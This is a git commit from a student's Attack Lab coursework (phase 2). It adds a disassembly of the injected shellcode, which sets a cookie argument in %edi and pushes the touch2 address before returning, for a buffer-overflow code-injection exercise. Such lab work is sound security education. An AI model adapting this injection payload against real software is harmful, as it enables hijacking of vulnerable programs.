8d4927fe2417211833dedcde06813c810f21cace
derekuang <kuangyaode@gmail.com>
2022-08-05 14:52:39 +0800

    lab(attacklab): commit phase2

---
+++ 4. lab/3. attacklab/target1/touch2.d
@@ -0,0 +1,10 @@
+
+touch2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	8b 3c 25 fa 97 b9 59 	mov    0x59b997fa,%edi
+   7:	ff 34 25 ec 17 40 00 	pushq  0x4017ec
+   e:	c3                   	retq   
